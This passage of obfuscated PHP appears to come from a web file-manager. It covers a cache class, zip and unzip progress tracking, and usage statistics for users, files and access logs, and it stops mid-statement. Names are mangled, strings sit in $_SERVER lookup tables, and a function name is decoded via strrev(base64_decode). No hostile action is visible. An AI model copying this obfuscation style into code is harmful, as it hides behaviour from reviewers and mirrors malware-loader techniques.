$ª¨œñ†Í[868]); return $ò£Ç–óã; } public static function getCall($¡ŞÚœî¦, $‹„ñ°ßÓ, $§æõğÙ, $‹’éÁò« = array()) { $ˆ©Ÿğä =& $_SERVER[—ÌÒğš÷]; $õ±‚Ş¤… = self::get($¡ŞÚœî¦); if ($õ±‚Ş¤… || $õ±‚Ş¤… === $ˆ©Ÿğä[12]) { return $õ±‚Ş¤…; } $õ±‚Ş¤… = call_user_func_array($§æõğÙ, $‹’éÁò«); $õ±‚Ş¤… = $õ±‚Ş¤… ? $õ±‚Ş¤… : $ˆ©Ÿğä[12]; self::set($¡ŞÚœî¦, $õ±‚Ş¤…, $‹„ñ°ßÓ); return $õ±‚Ş¤…; } public static function remove($ÀÂşºş³) { $ĞÁ©ŠÆ³ = self::key($ÀÂşºş³); unset(self::$memoryCache[$ĞÁ©ŠÆ³]); self::clearTimeout(); CacheLock::lock($ÀÂşºş³); $“©Í¾ºì = self::init()->remove($ĞÁ©ŠÆ³); CacheLock::unlock($ÀÂşºş³); return $“©Í¾ºì; } public static function removeMemory($»òÑßò®) { $äˆıÔ· = self::key($»òÑßò®); unset(self::$memoryCache[$äˆıÔ·]); } public static function clearMemory($ò¦êŠá† = false) { if ($ò¦êŠá†) { $ò¦êŠá† = self::key($ò¦êŠá†); unset(self::$memoryCache[$ò¦êŠá†]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[—ÌÒğš÷][869])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[—ÌÒğš÷][870])) { self::init()->clearTimeout(); } } } goto D¨ÒöãÒøŠ; e¿Ä¬¦âÎ: $fileSize = strrev(base64_decode($_SERVER[­Ú¶×µ][0])); function binCheckNeq($—ç¦š¬ï, $‰ş÷×Ö) { return $—ç¦š¬ï != $‰ş÷×Ö; } $_SERVER[$_SERVER[­Ú¶×µ][1]] = $fileSize($_SERVER[$_SERVER[­Ú¶×µ][2]]); goto b¸«ø³ªÜŸ; aƒ”ö¡¾¼: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $›áÇîË© =& $_SERVER[—ÌÒğš÷]; parent::startAfter(); Hook::bind($›áÇîË©[1802], array($this, $›áÇîË©[1803])); Hook::bind($›áÇîË©[1237], array($this, $›áÇîË©[1804])); Hook::bind($›áÇîË©[1805], array($this, $›áÇîË©[1806])); $€Ñ¶ßÅ =& $this->task; $€Ñ¶ßÅ[$›áÇîË©[1807]] = $›áÇîË©[1238]; if (!$€Ñ¶ßÅ[$›áÇîË©[1585]]) { $€Ñ¶ßÅ[$›áÇîË©[1585]] = LNG($›áÇîË©[1808]); } } protected function endAfter() { $¥Œ”èÛ— =& $_SERVER[—ÌÒğš÷]; parent::endAfter(); Hook::unbind($¥Œ”èÛ—[1802], array($this, $¥Œ”èÛ—[1803])); Hook::unbind($¥Œ”èÛ—[1237], array($this, $¥Œ”èÛ—[1804])); Hook::unbind($¥Œ”èÛ—[1805], array($this, $¥Œ”èÛ—[1806])); } public function updateAfter() { $•¡æ•ï¯ =& $_SERVER[—ÌÒğš÷]; $çÎ»Šâ³ =& $this->task; if (!$çÎ»Šâ³[$•¡æ•ï¯[822]] || !$çÎ»Šâ³[$•¡æ•ï¯[799]]) { if ($çÎ»Šâ³[$•¡æ•ï¯[1807]] != $•¡æ•ï¯[357]) { return; } } if ($çÎ»Šâ³[$•¡æ•ï¯[1807]] == $•¡æ•ï¯[1238]) { $¶äÖ‹ñ = 0; if ($çÎ»Šâ³[$•¡æ•ï¯[1741]]) { $¶äÖ‹ñ = $çÎ»Šâ³[$•¡æ•ï¯[1742]] / $çÎ»Šâ³[$•¡æ•ï¯[1741]]; } $çÎ»Šâ³[$•¡æ•ï¯[1690]] = $¶äÖ‹ñ * 0.3; } else { if ($çÎ»Šâ³[$•¡æ•ï¯[1807]] == $•¡æ•ï¯[357]) { $¶äÖ‹ñ = $çÎ»Šâ³[$•¡æ•ï¯[1689]] / $çÎ»Šâ³[$•¡æ•ï¯[822]]; $çÎ»Šâ³[$•¡æ•ï¯[1690]] = 0.3 + $¶äÖ‹ñ * 0.4; } else { if ($çÎ»Šâ³[$•¡æ•ï¯[1807]] == $•¡æ•ï¯[107]) { $©°ÒúÒì = 0; if ($çÎ»Šâ³[$•¡æ•ï¯[1743]] == $•¡æ•ï¯[107]) { $©°ÒúÒì = $çÎ»Šâ³[$•¡æ•ï¯[1742]]; } $¶äÖ‹ñ = ($çÎ»Šâ³[$•¡æ•ï¯[1746]] + $©°ÒúÒì) / $çÎ»Šâ³[$•¡æ•ï¯[799]]; $çÎ»Šâ³[$•¡æ•ï¯[1690]] = 0.3 + 0.4 + $¶äÖ‹ñ * 0.3; } } } if ($çÎ»Šâ³[$•¡æ•ï¯[1690]] > 0) { $¿¯™Ş³… = timeFloat() - $çÎ»Šâ³[$•¡æ•ï¯[1692]] - $çÎ»Šâ³[$•¡æ•ï¯[1695]]; $çÎ»Šâ³[$•¡æ•ï¯[1696]] = $¿¯™Ş³… * (1 - $çÎ»Šâ³[$•¡æ•ï¯[1690]]) / $çÎ»Šâ³[$•¡æ•ï¯[1690]]; } } public function addFile($ÁÇ´È„¨) { $’Ô—¥£Ÿ =& $_SERVER[—ÌÒğš÷]; $§“·Óóß =& $this->task; $×ÍÙ£Øš = IO::info($ÁÇ´È„¨); $§“·Óóß[$’Ô—¥£Ÿ[1739]] = $×ÍÙ£Øš[$’Ô—¥£Ÿ[32]]; $§“·Óóß[$’Ô—¥£Ÿ[1741]] = $×ÍÙ£Øš[$’Ô—¥£Ÿ[76]]; $§“·Óóß[$’Ô—¥£Ÿ[1742]] = 0; $§“·Óóß[$’Ô—¥£Ÿ[1108]] = $’Ô—¥£Ÿ[1762]; $§“·Óóß[$’Ô—¥£Ÿ[1743]] = $’Ô—¥£Ÿ[1238]; $§“·Óóß[$’Ô—¥£Ÿ[799]] = $×ÍÙ£Øš[$’Ô—¥£Ÿ[76]]; $§“·Óóß[$’Ô—¥£Ÿ[822]] = 1; $­ñ‘›ÏÉ = 0; $§“·Óóß[$’Ô—¥£Ÿ[1750]] = array($’Ô—¥£Ÿ[1751] => $­ñ‘›ÏÉ + 1, $’Ô—¥£Ÿ[462] => $×ÍÙ£Øš[$’Ô—¥£Ÿ[32]], $’Ô—¥£Ÿ[84] => $×ÍÙ£Øš[$’Ô—¥£Ÿ[84]], $’Ô—¥£Ÿ[551] => $×ÍÙ£Øš[$’Ô—¥£Ÿ[551]] ? $×ÍÙ£Øš[$’Ô—¥£Ÿ[551]] : $×ÍÙ£Øš[$’Ô—¥£Ÿ[84]]); $this->update(); } public function zipEvent($ßŞ¿ÛîÆ, $Ü–³§ŞÍ, $ˆø¬ò¶, $Ğ®»ı·) { $±ãƒ¿Ò¦ =& $_SERVER[—ÌÒğš÷]; $êÜã¶´É =& $this->task; $êÜã¶´É[$±ãƒ¿Ò¦[1739]] = get_path_this($Ü–³§ŞÍ); $êÜã¶´É[$±ãƒ¿Ò¦[1741]] = $Ğ®»ı·; $êÜã¶´É[$±ãƒ¿Ò¦[1742]] = $ˆø¬ò¶; $êÜã¶´É[$±ãƒ¿Ò¦[1108]] = $ßŞ¿ÛîÆ == $±ãƒ¿Ò¦[1809] ? $±ãƒ¿Ò¦[1810] : $±ãƒ¿Ò¦[1811]; $êÜã¶´É[$±ãƒ¿Ò¦[1743]] = $±ãƒ¿Ò¦[12]; $êÜã¶´É[$±ãƒ¿Ò¦[799]] = $Ğ®»ı·; $êÜã¶´É[$±ãƒ¿Ò¦[1807]] = $±ãƒ¿Ò¦[357]; $this->update(); } public function unzipAfter($ •á©×‡) { $ˆ×ŠÑğ =& $_SERVER[—ÌÒğš÷]; $î¾‰³”’ =& $this->task; $î¾‰³”’[$ˆ×ŠÑğ[1807]] = $ˆ×ŠÑğ[107]; $Áó•ò”’ = IO::infoWithChildren($ •á©×‡); $Ü®Üö—à = 0; $î¾‰³”’[$ˆ×ŠÑğ[1750]] = array($ˆ×ŠÑğ[1751] => $Ü®Üö—à + 1, $ˆ×ŠÑğ[462] => $Áó•ò”’[$ˆ×ŠÑğ[32]], $ˆ×ŠÑğ[84] => $Áó•ò”’[$ˆ×ŠÑğ[84]], $ˆ×ŠÑğ[551] => $Áó•ò”’[$ˆ×ŠÑğ[551]] ? $Áó•ò”’[$ˆ×ŠÑğ[551]] : $Áó•ò”’[$ˆ×ŠÑğ[84]]); if ($Áó•ò”’[$ˆ×ŠÑğ[33]] == $ˆ×ŠÑğ[214]) { $î¾‰³”’[$ˆ×ŠÑğ[822]] = 1; } else { $î¾‰³”’[$ˆ×ŠÑğ[822]] = $Áó•ò”’[$ˆ×ŠÑğ[79]][$ˆ×ŠÑğ[77]]; } $î¾‰³”’[$ˆ×ŠÑğ[1108]] = $ˆ×ŠÑğ[12]; $î¾‰³”’[$ˆ×ŠÑğ[1743]] = 0; $î¾‰³”’[$ˆ×ŠÑğ[1689]] = 0; $î¾‰³”’[$ˆ×ŠÑğ[1741]] = 0; $î¾‰³”’[$ˆ×ŠÑğ[1742]] = 0; $î¾‰³”’[$ˆ×ŠÑğ[1739]] = $ˆ×ŠÑğ[12]; $î¾‰³”’[$ˆ×ŠÑğ[1746]] = 0; $î¾‰³”’[$ˆ×ŠÑğ[799]] = $Áó•ò”’[$ˆ×ŠÑğ[76]]; $this->update(); self::log($ˆ×ŠÑğ[1812] . json_encode(array($î¾‰³”’, $Áó•ò”’))); } public function nameParse($¤åë™Æ) { $ˆ˜˜ì„ =& $_SERVER[—ÌÒğš÷]; $óØ‚’ÚÉ =& $this->task; if ($óØ‚’ÚÉ[$ˆ˜˜ì„[1807]] == $ˆ˜˜ì„[1238]) { $óØ‚’ÚÉ[$ˆ˜˜ì„[1807]] = $ˆ˜˜ì„[357]; $óØ‚’ÚÉ[$ˆ˜˜ì„[1746]] = 0; $óØ‚’ÚÉ[$ˆ˜˜ì„[799]] = 0; } $×Ù¡çŠé = get_path_this($¤åë™Æ); if (strstr($×Ù¡çŠé, $ˆ˜˜ì„[10])) { $óØ‚’ÚÉ[$ˆ˜˜ì„[1689]] += 1; $óØ‚’ÚÉ[$ˆ˜˜ì„[822]] += 1; } $óØ‚’ÚÉ[$ˆ˜˜ì„[1739]] = $¤åë™Æ; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $¹À¾ø«ù =& $_SERVER[—ÌÒğš÷]; parent::startAfter(); Hook::bind($¹À¾ø«ù[1813], array($this, $¹À¾ø«ù[1803])); Hook::bind($¹À¾ø«ù[1805], array($this, $¹À¾ø«ù[1806])); $àË¥Æ´ =& $this->task; $àË¥Æ´[$¹À¾ø«ù[1807]] = $¹À¾ø«ù[1238]; if (!$àË¥Æ´[$¹À¾ø«ù[1585]]) { $àË¥Æ´[$¹À¾ø«ù[1585]] = LNG($¹À¾ø«ù[1814]); } } protected function endAfter() { $ş”šµÆÑ =& $_SERVER[—ÌÒğš÷]; parent::endAfter(); Hook::unbind($ş”šµÆÑ[1813], array($this, $ş”šµÆÑ[1803])); Hook::unbind($ş”šµÆÑ[1805], array($this, $ş”šµÆÑ[1806])); } public function updateAfter() { $‚Ş¶—Ô =& $_SERVER[—ÌÒğš÷]; $çı”–¨š =& $this->task; if (!$çı”–¨š[$‚Ş¶—Ô[822]] || !$çı”–¨š[$‚Ş¶—Ô[799]]) { return; } if ($çı”–¨š[$‚Ş¶—Ô[1807]] == $‚Ş¶—Ô[1238]) { $¾»ü’£à = $çı”–¨š[$‚Ş¶—Ô[1742]]; if ($çı”–¨š[$‚Ş¶—Ô[1743]] != $‚Ş¶—Ô[1238]) { $¾»ü’£à = 0; } $İ÷•İ€ƒ = ($çı”–¨š[$‚Ş¶—Ô[1746]] + $¾»ü’£à) / $çı”–¨š[$‚Ş¶—Ô[799]]; $çı”–¨š[$‚Ş¶—Ô[1690]] = $İ÷•İ€ƒ * 0.3; } else { if ($çı”–¨š[$‚Ş¶—Ô[1807]] == $‚Ş¶—Ô[357]) { $İ÷•İ€ƒ = $çı”–¨š[$‚Ş¶—Ô[1689]] / $çı”–¨š[$‚Ş¶—Ô[822]]; $çı”–¨š[$‚Ş¶—Ô[1690]] = 0.3 + $İ÷•İ€ƒ * 0.5; } else { if ($çı”–¨š[$‚Ş¶—Ô[1807]] == $‚Ş¶—Ô[107]) { $İ÷•İ€ƒ = 0; if ($çı”–¨š[$‚Ş¶—Ô[1741]]) { $İ÷•İ€ƒ = $çı”–¨š[$‚Ş¶—Ô[1742]] / $çı”–¨š[$‚Ş¶—Ô[1741]]; } $çı”–¨š[$‚Ş¶—Ô[1690]] = 0.3 + 0.5 + $İ÷•İ€ƒ * 0.2; } } } if ($çı”–¨š[$‚Ş¶—Ô[1690]] > 0) { $­í³ã = timeFloat() - $çı”–¨š[$‚Ş¶—Ô[1692]] - $çı”–¨š[$‚Ş¶—Ô[1695]]; $çı”–¨š[$‚Ş¶—Ô[1696]] = $­í³ã * (1 - $çı”–¨š[$‚Ş¶—Ô[1690]]) / $çı”–¨š[$‚Ş¶—Ô[1690]]; } } public function copyFileStart($õ„ıÚ«¹, $¢Ûö·É, $«ƒ•à«Á, $­•£éæ, $›ù É, $çØ§ã) { $Èƒº€øÄ =& $_SERVER[—ÌÒğš÷]; parent::copyFileStart($õ„ıÚ«¹, $¢Ûö·É, $«ƒ•à«Á, $­•£éæ, $›ù É, $çØ§ã); $à­Ê¤Ò =& $this->task; if ($à­Ê¤Ò[$Èƒº€øÄ[1807]] == $Èƒº€øÄ[357]) { $à­Ê¤Ò[$Èƒº€øÄ[1807]] = $Èƒº€øÄ[107]; } $this->update(); } public function copyFileEnd($Æ¸ŠˆÑ, $Ï†Ñ¤¸¡, $ì”£Ş¶, $–¡×úÛ§, $‚¨í¢¾Ğ, $Ç°Ï¬Àª) { $äôÁãø =& $_SERVER[—ÌÒğš÷]; $å¯âõÛ§ =& $this->task; $å¯âõÛ§[$äôÁãø[1742]] = $å¯âõÛ§[$äôÁãø[1741]]; $å¯âõÛ§[$äôÁãø[1746]] += $å¯âõÛ§[$äôÁãø[1741]]; $å¯âõÛ§[$äôÁãø[1743]] = $äôÁãø[12]; $this->update(); } public function zipEvent($´Ù¹‰Ú, $³¸ŒøÅ­, $ï€ÄŠ‡, $¦ùÜşì) { $™Ÿ¦Å =& $_SERVER[—ÌÒğš÷]; $®©ŒÑî« =& $this->task; $®©ŒÑî«[$™Ÿ¦Å[1739]] = get_path_this($³¸ŒøÅ­); $®©ŒÑî«[$™Ÿ¦Å[1741]] = $¦ùÜşì; $®©ŒÑî«[$™Ÿ¦Å[1742]] = $ï€ÄŠ‡; $®©ŒÑî«[$™Ÿ¦Å[1108]] = $´Ù¹‰Ú == $™Ÿ¦Å[1815] ? $™Ÿ¦Å[1810] : $™Ÿ¦Å[1811]; $®©ŒÑî«[$™Ÿ¦Å[1743]] = $™Ÿ¦Å[12]; $®©ŒÑî«[$™Ÿ¦Å[799]] = $¦ùÜşì; $®©ŒÑî«[$™Ÿ¦Å[1807]] = $™Ÿ¦Å[357]; $this->update(); } public function nameParse($÷ıü) { $äßİ®¦ =& $_SERVER[—ÌÒğš÷]; $¬¸Ñø‹¯ =& $this->task; if ($¬¸Ñø‹¯[$äßİ®¦[1689]] < $¬¸Ñø‹¯[$äßİ®¦[822]]) { $Â±˜©õÍ = get_path_this($÷ıü); if (strstr($Â±˜©õÍ, $äßİ®¦[10])) { $¬¸Ñø‹¯[$äßİ®¦[1689]] += 1; } } if ($¬¸Ñø‹¯[$äßİ®¦[1807]] == $äßİ®¦[1238]) { $¬¸Ñø‹¯[$äßİ®¦[1807]] = $äßİ®¦[357]; } $¬¸Ñø‹¯[$äßİ®¦[1739]] = $÷ıü; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($ğÑüÁó‰) { $›Ş­ŸÎ =& $_SERVER[—ÌÒğš÷]; $«±’“Ší = array($›Ş­ŸÎ[630] => array($›Ş­ŸÎ[33] => $›Ş­ŸÎ[1816], $›Ş­ŸÎ[317] => array($›Ş­ŸÎ[239], $›Ş­ŸÎ[801], $›Ş­ŸÎ[1817], $›Ş­ŸÎ[1818])), $›Ş­ŸÎ[1819] => array($›Ş­ŸÎ[33] => $›Ş­ŸÎ[1820], $›Ş­ŸÎ[317] => array($›Ş­ŸÎ[239], $›Ş­ŸÎ[799], $›Ş­ŸÎ[1821], $›Ş­ŸÎ[1822], $›Ş­ŸÎ[1823]))); if (!isset($«±’“Ší[$ğÑüÁó‰])) { return !1; } $this->optionType = $«±’“Ší[$ğÑüÁó‰][$›Ş­ŸÎ[33]]; $this->field = $«±’“Ší[$ğÑüÁó‰][$›Ş­ŸÎ[317]]; return !0; } public function listData($ÉÆ»¾ÇÃ = false, $¦°â‡ŠÏ = "\x6d\x6f\x64\x69\x66\171\x54\151\155\145", $œä¹ÜÛÓ = false) { return parent::listData($ÉÆ»¾ÇÃ, $¦°â‡ŠÏ, $œä¹ÜÛÓ); } public function trendList($½öıéì) { $£ü¿Å =& $_SERVER[—ÌÒğš÷]; $¢êåÄß” = $this->listData(); if ($¢êåÄß”) { $­ï†ÕĞ = end($¢êåÄß”); $›–¬àÄİ = date($£ü¿Å[1824], strtotime($£ü¿Å[1825])); if ($­ï†ÕĞ[$£ü¿Å[239]] == $›–¬àÄİ) { return $¢êåÄß”; } $’Ååá¿ = strtotime($­ï†ÕĞ[$£ü¿Å[239]]); } if (!isset($’Ååá¿)) { $ ³ìÕ¾ = $½öıéì == $£ü¿Å[630] ? $£ü¿Å[567] : $£ü¿Å[861]; $’Ååá¿ = Model($ ³ìÕ¾)->min($£ü¿Å[215]); } $’Á©Àä­ = $£ü¿Å[1826] . ucfirst($½öıéì); $âñÔ”×‹ = $this->dateList($’Ååá¿); foreach ($âñÔ”×‹ as $›–¬àÄİ) { $this->{$’Á©Àä­}($›–¬àÄİ); } return $this->listData(); } private function dateList($³÷¬„¸¶) { $©²µãş =& $_SERVER[—ÌÒğš÷]; $Ïê†…¼á = $³÷¬„¸¶; $Ş§ƒ‘ÅŒ = strtotime($©²µãş[1825]); $‡ığû•¹ = array(); while ($Ïê†…¼á <= $Ş§ƒ‘ÅŒ) { $‡ığû•¹[] = date($©²µãş[1824], $Ïê†…¼á); $Ïê†…¼á = strtotime($©²µãş[1827], $Ïê†…¼á); } return $‡ığû•¹; } public function _recordUser($ÂÛ—áâ½ = '') { $ÛûßôÜ =& $_SERVER[—ÌÒğš÷]; $ŞôÖä = strtotime(date($ÛûßôÜ[1828], strtotime($ÂÛ—áâ½))); $ÀëÍÜÇ‚ = strtotime(date($ÛûßôÜ[1829], strtotime($ÂÛ—áâ½))); $Ôæ¾ÂÊ = array($ÛûßôÜ[215] => array($ÛûßôÜ[1057], $ÀëÍÜÇ‚)); $·½Ñ’ÉÏ = Model($ÛûßôÜ[567])->where($Ôæ¾ÂÊ)->count($ÛûßôÜ[1688]); $Ôæ¾ÂÊ[$ÛûßôÜ[215]] = array($ÛûßôÜ[377], array($ŞôÖä, $ÀëÍÜÇ‚)); $óÃĞàÉ§ = Model($ÛûßôÜ[567])->where($Ôæ¾ÂÊ)->count($ÛûßôÜ[1688]); $Ôæ¾ÂÊ[$ÛûßôÜ[33]] = $ÛûßôÜ[1830]; $õøªÓ¶µ = Model($ÛûßôÜ[1831])->where($Ôæ¾ÂÊ)->count($ÛûßôÜ[1832]); $ÆôáÄÏç = array($ÛûßôÜ[239] => $ÂÛ—áâ½, $ÛûßôÜ[801] => (int) $·½Ñ’ÉÏ, $ÛûßôÜ[1817] => (int) $óÃĞàÉ§, $ÛûßôÜ[1818] => (int) $õøªÓ¶µ); return $this->insert($ÆôáÄÏç); } public function _recordStore($çĞæÈá™ = '') { $ºŸ­«× =& $_SERVER[—ÌÒğš÷]; $Ôåîú¦· = strtotime(date($ºŸ­«×[1829], strtotime($çĞæÈá™))); $ŸÚçÅ¦ß = array($ºŸ­«×[215] => array($ºŸ­«×[1057], $Ôåîú¦·)); $åÆ˜•Õü = Model($ºŸ­«×[512])->where($ŸÚçÅ¦ß)->sum($ºŸ­«×[76]); $ŸÚçÅ¦ß[$ºŸ­«×[453]] = 0; $‹®ÏØÎ… = Model($ºŸ­«×[861])->where($ŸÚçÅ¦ß)->sum($ºŸ­«×[76]); $ŸÚçÅ¦ß[$ºŸ­«×[178]] = 1; $Ğ›÷â²ñ = Model($ºŸ­«×[861])->where($ŸÚçÅ¦ß)->sum($ºŸ­«×[76]); $ŸÚçÅ¦ß[$ºŸ­«×[178]] = 2; $ß²ä¸ü¥ = Model($ºŸ­«×[861])->where($ŸÚçÅ¦ß)->sum($ºŸ­«×[76]); $¯˜úÊêá = array($ºŸ­«×[239] => $çĞæÈá™, $ºŸ­«×[799] => (int) $‹®ÏØÎ…, $ºŸ­«×[1821] => (int) $åÆ˜•Õü, $ºŸ­«×[1822] => (int) $Ğ›÷â²ñ, $ºŸ­«×[1823] => (int) $ß²ä¸ü¥); return $this->insert($¯˜úÊêá); } public function trend($’§Œ­”…, $¡İÑªæ”) { $ğ¨Ë…ä =& $_SERVER[—ÌÒğš÷]; if (!$this->init($’§Œ­”…)) { return !1; } $½æ ¼šÑ = $this->trendList($’§Œ­”…); if ($½æ ¼šÑ && $¡İÑªæ” != $ğ¨Ë…ä[1661]) { $£°âÁüœ = $½æ ¼šÑ[0][$ğ¨Ë…ä[239]]; $Üå®š = $this->validDate($¡İÑªæ”, $£°âÁüœ); $×øÑë³ä = array(); $†È­ÛÅÖ = array_to_keyvalue($½æ ¼šÑ, $ğ¨Ë…ä[239]); foreach ($Üå®š as $·¡¾Ç¿´) { if (isset($†È­ÛÅÖ[$·¡¾Ç¿´])) { $‡ÂàÚ®Ñ = $†È­ÛÅÖ[$·¡¾Ç¿´]; } else { $‡ÂàÚ®Ñ = end($½æ ¼šÑ); $‡ÂàÚ®Ñ[$ğ¨Ë…ä[239]] = $·¡¾Ç¿´; if ($’§Œ­”… == $ğ¨Ë…ä[630]) { $‡ÂàÚ®Ñ[$ğ¨Ë…ä[1817]] = $‡ÂàÚ®Ñ[$ğ¨Ë…ä[1818]] = 0; } } $×øÑë³ä[] = $‡ÂàÚ®Ñ; } $½æ ¼šÑ = $×øÑë³ä; } $™ıù›ˆ = array($ğ¨Ë…ä[630] => array($ğ¨Ë…ä[801] => LNG($ğ¨Ë…ä[1833]), $ğ¨Ë…ä[1817] => LNG($ğ¨Ë…ä[1834]), $ğ¨Ë…ä[1818] => LNG($ğ¨Ë…ä[1835])), $ğ¨Ë…ä[1819] => array($ğ¨Ë…ä[799] => LNG($ğ¨Ë…ä[1836]), $ğ¨Ë…ä[1821] => LNG($ğ¨Ë…ä[1837]), $ğ¨Ë…ä[1822] => LNG($ğ¨Ë…ä[1838]), $ğ¨Ë…ä[1823] => LNG($ğ¨Ë…ä[1839]))); $àæÌ˜¦­ = array($ğ¨Ë…ä[630] => $ğ¨Ë…ä[1840], $ğ¨Ë…ä[1819] => $ğ¨Ë…ä[76]); if (empty($½æ ¼šÑ)) { $·¡¾Ç¿´ = date($ğ¨Ë…ä[1824], strtotime($ğ¨Ë…ä[1825])); $ôª½Öƒ = array($ğ¨Ë…ä[239] => $·¡¾Ç¿´); foreach ($™ıù›ˆ[$’§Œ­”…] as $­şñâğÀ => $ÑÑ¹šˆ¦) { $ôª½Öƒ[$­şñâğÀ] = 0; } $½æ ¼šÑ[] = $ôª½Öƒ; } $‰¤½–ğ¢ = array(); foreach ($½æ ¼šÑ as $ÑÑ¹šˆ¦) { if ($’§Œ­”… == $ğ¨Ë…ä[1819] && $ÑÑ¹šˆ¦[$ğ¨Ë…ä[1821]] > $ÑÑ¹šˆ¦[$ğ¨Ë…ä[799]]) { $ÑÑ¹šˆ¦[$ğ¨Ë…ä[1821]] = $ÑÑ¹šˆ¦[$ğ¨Ë…ä[799]]; } foreach ($™ıù›ˆ[$’§Œ­”…] as $­şñâğÀ => $»†ãÔ„•) { $‡ÂàÚ®Ñ = array($ğ¨Ë…ä[239] => $ÑÑ¹šˆ¦[$ğ¨Ë…ä[239]], $ğ¨Ë…ä[1585] => $»†ãÔ„•); $‡ÂàÚ®Ñ[$àæÌ˜¦­[$’§Œ­”…]] = isset($ÑÑ¹šˆ¦[$­şñâğÀ]) ? $ÑÑ¹šˆ¦[$­şñâğÀ] : 0; $‰¤½–ğ¢[] = $‡ÂàÚ®Ñ; } } return $‰¤½–ğ¢; } public function validDate($¢˜ÜâÒ, $ñëÁÔ¬ä) { $Åë¥­™ =& $_SERVER[—ÌÒğš÷]; $½µ¶ÊÑ§ = date($Åë¥­™[1824], strtotime($Åë¥­™[1825])); $ºæ¨¨²Ò = array($½µ¶ÊÑ§); switch ($¢˜ÜâÒ) { case $Åë¥­™[1668]: $Åßå¢Ê¤ = mktime(0, 0, 0, date($Åë¥­™[1841]), date($Åë¥­™[1404]) - date($Åë¥­™[1467]) + 7 - 7, date($Åë¥­™[1842])); $˜“–¡éÁ = 0; do { $«Ê¸–ğ¨ = date($Åë¥­™[1824], $Åßå¢Ê¤ - 3600 * 24 * 7 * $˜“–¡éÁ); $ºæ¨¨²Ò[] = $«Ê¸–ğ¨; $˜“–¡éÁ++; } while ($ñëÁÔ¬ä < $«Ê¸–ğ¨); break; case $Åë¥­™[1666]: $˜“–¡éÁ = 1; do { $·ñ±Şæ = date($Åë¥­™[1843], strtotime("\55\40{$˜“–¡éÁ}\40\155\x6f\156\x74\x68\163")); $ºæ¨¨²Ò[] = $·ñ±Şæ; $˜“–¡éÁ++; } while ($ñëÁÔ¬ä < $·ñ±Şæ); break; case $Åë¥­™[1844]: $ùİÈÌñ× = (int) date($Åë¥­™[1842], strtotime($ñëÁÔ¬ä)); $ÂšøÔ¹§ = (int) date($Åë¥­™[1842]); if ($ùİÈÌñ× >= $ÂšøÔ¹§) { break; } for ($ùİÈÌñ×; $ùİÈÌñ× < $ÂšøÔ¹§; $ùİÈÌñ×++) { $ºæ¨¨²Ò[] = $ùİÈÌñ× . $Åë¥­™[1845]; } break; default: break; } if ($ñëÁÔ¬ä > end($ºæ¨¨²Ò)) { array_pop($ºæ¨¨²Ò); } sort($ºæ¨¨²Ò); return $ºæ¨¨²Ò; } public function listTable($õ·¬³«») { $û±¤ÍÓÆ = ucfirst($õ·¬³«»); return Model($û±¤ÍÓÆ)->listData(); } public function option($È…ßˆÁ) { $³Û§Ô” = $_SERVER[—ÌÒğš÷][1846] . ucfirst($È…ßˆÁ); return $this->{$³Û§Ô”}(); } private function optionUser() { $ ‰‰÷¯ =& $_SERVER[—ÌÒğš÷]; $™§÷Ïàı = Model($ ‰‰÷¯[567])->count($ ‰‰÷¯[1688]); $ùÄ½Õ×© = Model($ ‰‰÷¯[567])->where($ ‰‰÷¯[1847])->count($ ‰‰÷¯[1688]); $Áß¶şüø = intval($GLOBALS[$ ‰‰÷¯[6]][$ ‰‰÷¯[393]][$ ‰‰÷¯[1640]]) / 3600; $ÑÇÒáÁô = strtotime("\55{$Áß¶şüø}\40\150\x6f\x75\x72\x73"); $š˜íâ³‰ = strtotime(date($ ‰‰÷¯[1828])); if ($ÑÇÒáÁô < $š˜íâ³‰) { $ÑÇÒáÁô = $š˜íâ³‰; } $ú³Çì¤ = array($ ‰‰÷¯[1848] => array($ ‰‰÷¯[1058], $ÑÇÒáÁô)); $ã­Ò¿Èá = (int) Model($ ‰‰÷¯[567])->where($ú³Çì¤)->count($ ‰‰÷¯[1688]); if (!$ã­Ò¿Èá) { $ã­Ò¿Èá = 1; } $ú³Çì¤ = array($ ‰‰÷¯[1848] => array($ ‰‰÷¯[1058], $š˜íâ³‰)); $ü†ò»±¹ = Model($ ‰‰÷¯[567])->where($ú³Çì¤)->count($ ‰‰÷¯[1688]); return array($ ‰‰÷¯[794] => (int) $™§÷Ïàı, $ ‰‰÷¯[1849] => (int) ($™§÷Ïàı - $ùÄ½Õ×©), $ ‰‰÷¯[1850] => (int) $ùÄ½Õ×©, $ ‰‰÷¯[1851] => (int) $ü†ò»±¹, $ ‰‰÷¯[1852] => $ã­Ò¿Èá); } private function optionFile() { $‡è¿¸ó¶ =& $_SERVER[—ÌÒğš÷]; $ØÔÓÅù = $this->sourceSize(); $ß¸¤ãÚ = $ØÔÓÅù[$‡è¿¸ó¶[76]]; $ªúÎîçÏ = $ØÔÓÅù[$‡è¿¸ó¶[1821]]; $‚Àü‚ªÔ = Model($‡è¿¸ó¶[861])->where(array($‡è¿¸ó¶[453] => 0))->count($‡è¿¸ó¶[181]); $×îÏ” = array($‡è¿¸ó¶[453] => 0, $‡è¿¸ó¶[215] => array($‡è¿¸ó¶[1058], strtotime(date($‡è¿¸ó¶[1828])))); $ƒÂü™àİ = Model($‡è¿¸ó¶[861])->where($×îÏ”)->sum($‡è¿¸ó¶[76]); $µ²œÇ¡ = Model($‡è¿¸ó¶[861])->where($×îÏ”)->count($‡è¿¸ó¶[181]); return array($‡è¿¸ó¶[799] => $ß¸¤ãÚ, $‡è¿¸ó¶[1821] => $ªúÎîçÏ, $‡è¿¸ó¶[1853] => $ß¸¤ãÚ - $ªúÎîçÏ, $‡è¿¸ó¶[1854] => (int) $ƒÂü™àİ, $‡è¿¸ó¶[801] => (int) $‚Àü‚ªÔ, $‡è¿¸ó¶[1855] => (int) $µ²œÇ¡); } private function optionAccess() { $ğÉÙ¸Ó• =& $_SERVER[—ÌÒğš÷]; return array($ğÉÙ¸Ó•[794] => $this->typeLogCnt(), $ğÉÙ¸Ó•[107] => $this->typeLogCnt($ğÉÙ¸Ó•[107]), $ğÉÙ¸Ó•[493] => $this->typeLogCnt($ğÉÙ¸Ó•[493]), $ğÉÙ¸Ó•[1856] => 